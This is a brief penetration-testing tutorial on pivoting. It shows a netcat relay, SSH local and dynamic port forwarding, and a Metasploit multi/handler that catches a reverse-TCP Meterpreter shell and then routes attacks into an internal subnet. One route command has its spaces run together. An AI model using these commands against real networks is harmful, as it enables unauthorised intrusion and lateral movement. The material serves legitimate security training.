# Pivoting

The technique of using one compromised machine to access another is called pivoting.

### Netcat Relay

> `$mknod backpipe p`
>
> `$nc –l –p 80 0<backpipe | nc 192.168.128.128 80 1>backpipe`

![](/assets/netcat_relay.png)

### SSH Local Port Forwarding

SSH local port forwarding is set up by the command below:

> `$ ssh –L port:destination_host:destination_port username@pivot_host`

`-L` indicates to use local port forwarding

![](/assets/ssh_local.png)

### SSH Dynamic Port Forwarding

The syntax is as below:

> `ssh –D address:port –f –N username@pivot_host`

`-D` indicates to use dynamic port forwarding, `address` is local machine \(127.0.0.1\)

An example is shown below:

> `# ssh -D 127.0.0.1:9150 -f -N user@192.168.112.132`
>
> `user@192.168.112.132's password:`

![](/assets/ssh_dynamic_port_fwd.png)

_ **SSH dynamic port forwarding can access multiple systems on different ports.**_

##### Pivot with Metasploit and Meterpreter Sessions

**Step 1** Start the multi/handler exploit

> `msf > use exploit/multi/handler`
>
> `msf exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp`
>
> `payload => linux/x86/meterpreter/reverse_tcp`
>
> `msf exploit(handler) > set LHOST 192.168.112.132`
>
> `LHOST => 192.168.112.132`
>
> `msf exploit(handler) > set LPORT 2222`
>
> `LPORT => 2222`
>
> `msf exploit(handler) > run`

**Step 2** Run the executable on the compromised host and establish a Meterpreter session

**Step 3** Set up pivot by the metasploit route command

> `msf exploit(handler) > route add192.168.128.0255.255.255.0 1`
>
> `[*] Route added`
>
> `msf auxiliary(tcp) > route print`

**Step 4** Now metasploit modules can pivot through the compromised host and target  
 systems on the internal network \(192.168.128.0/24\).

### Pivoting Technique Summary

##### ![](/assets/pivot_summary.png)

### Interaction Between Web Application Penetration Testing Tools and pivoting

### ![](/assets/web_app_tool_pivot.png)


